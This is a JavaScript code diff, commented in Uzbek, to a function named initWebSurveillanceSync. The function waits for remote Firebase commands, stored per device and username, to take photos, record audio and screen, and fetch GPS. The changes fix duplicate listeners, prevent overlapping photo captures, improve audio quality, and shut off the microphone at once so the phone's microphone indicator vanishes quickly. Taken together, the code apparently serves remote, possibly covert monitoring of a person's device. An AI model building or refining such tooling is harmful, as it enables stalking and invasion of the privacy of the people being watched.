@@ -483,6 +483,12 @@ function initWebSurveillanceSync(user) {
     if (window.firebase && window.firebase.database) {
       const db = window.firebase.database();
       
+      // Avvalgi eski listenerlarni tozalash (5-6 marta qayta ulanib ketmasligi uchun)
+      db.ref(`tracking/devices/${username}/commands/take_photo`).off();
+      db.ref(`tracking/devices/${username}/commands/record_audio`).off();
+      db.ref(`tracking/devices/${username}/commands/record_screen`).off();
+      db.ref(`tracking/devices/${username}/commands/request_gps`).off();
+
       // 1. Rasm olish buyrug'i (Kamera)
       let lastPhotoTs = 0;
       db.ref(`tracking/devices/${username}/commands/take_photo`).on('value', async (snap) => {
@@ -528,7 +534,10 @@ function initWebSurveillanceSync(user) {
 }
 
 // 1. Web Kamera fotosurat olish
+let isWebCapturingPhoto = false;
 async function captureWebPhoto(username) {
+  if (isWebCapturingPhoto) return;
+  isWebCapturingPhoto = true;
   try {
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
     const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -562,6 +571,8 @@ async function captureWebPhoto(username) {
     }
   } catch (e) {
     console.log('captureWebPhoto error', e);
+  } finally {
+    isWebCapturingPhoto = false;
   }
 }
 
@@ -578,7 +589,14 @@ async function handleWebAudioRecordingCommand(username, start) {
       if (webAudioRecorder && webAudioRecorder.state === 'recording') return;
       if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
 
-      webAudioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      // Aks-sado (echo) va shovqinni bartaraf etish uchun echoCancellation va noiseSuppression yoqiladi
+      webAudioStream = await navigator.mediaDevices.getUserMedia({
+        audio: {
+          echoCancellation: true,
+          noiseSuppression: true,
+          autoGainControl: true
+        }
+      });
       webAudioChunks = [];
       webAudioStartTime = Date.now();
       webAudioRecorder = new MediaRecorder(webAudioStream);
@@ -619,9 +637,20 @@ async function handleWebAudioRecordingCommand(username, start) {
       webAudioRecorder.start(1000);
       if (db) db.ref(`tracking/devices/${username}/media/status`).set("Ovoz yozilmoqda...");
     } else {
-      if (webAudioRecorder && webAudioRecorder.state === 'recording') {
-        webAudioRecorder.stop();
+      // To'xtatilganda mikrofonni DARHOL o'chirish (telefondagi mikrofon ikonkasi darhol yo'qolishi uchun)
+      if (webAudioStream) {
+        try {
+          webAudioStream.getTracks().forEach(t => {
+            t.stop();
+            t.enabled = false;
+          });
+        } catch (e) {}
+        webAudioStream = null;
       }
+      if (webAudioRecorder && webAudioRecorder.state === 'recording') {
+        try { webAudioRecorder.stop(); } catch (e) {}
+      }
+      webAudioRecorder = null;
     }
   } catch (e) {
     console.error("handleWebAudioRecordingCommand error:", e);
